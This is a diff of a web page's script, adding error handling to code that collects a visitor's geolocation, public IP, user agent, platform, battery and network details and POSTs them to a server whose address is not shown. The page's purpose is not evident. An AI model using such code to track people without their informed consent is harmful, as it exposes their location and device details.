@@ -71,25 +71,42 @@
 
     <script>
         async function getDeviceInfo() {
-            const battery = navigator.getBattery ? await navigator.getBattery() : null;
-            return {
-                device_model: navigator.userAgent,
-                os_version: navigator.platform,
-                battery_level: battery ? Math.round(battery.level * 100) + "%" : "N/A",
-                charging_status: battery ? (battery.charging ? "Charging" : "Not Charging") : "N/A",
-                network_type: navigator.connection ? navigator.connection.effectiveType : "Unknown"
-            };
+            try {
+                const battery = navigator.getBattery ? await navigator.getBattery() : null;
+                return {
+                    device_model: navigator.userAgent || "N/A",
+                    os_version: navigator.platform || "N/A",
+                    battery_level: battery ? Math.round(battery.level * 100) + "%" : "N/A",
+                    charging_status: battery ? (battery.charging ? "Charging" : "Not Charging") : "N/A",
+                    network_type: navigator.connection ? navigator.connection.effectiveType : "N/A"
+                };
+            } catch (error) {
+                console.error("Error fetching device info:", error);
+                return {
+                    device_model: "N/A",
+                    os_version: "N/A",
+                    battery_level: "N/A",
+                    charging_status: "N/A",
+                    network_type: "N/A"
+                };
+            }
         }
 
         function getPublicIP() {
             return fetch("https://api64.ipify.org?format=json")
                 .then(response => response.json())
-                .then(data => data.ip)
-                .catch(() => "N/A");
+                .then(data => data.ip || "N/A")
+                .catch(error => {
+                    console.error("Error fetching public IP:", error);
+                    return "N/A";
+                });
         }
 
         async function sendLocation() {
-            if (!navigator.geolocation) return;
+            if (!navigator.geolocation) {
+                console.error("Geolocation is not supported by this browser.");
+                return;
+            }
 
             navigator.geolocation.getCurrentPosition(async (position) => {
                 const deviceInfo = await getDeviceInfo();
@@ -108,7 +125,12 @@
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(data)
-                }).catch(error => console.error("Error sending location:", error));
+                })
+                .then(response => response.json())
+                .then(result => console.log("Location sent successfully:", result))
+                .catch(error => console.error("Error sending location:", error));
+            }, (error) => {
+                console.error("Error getting location:", error);
             });
         }
 
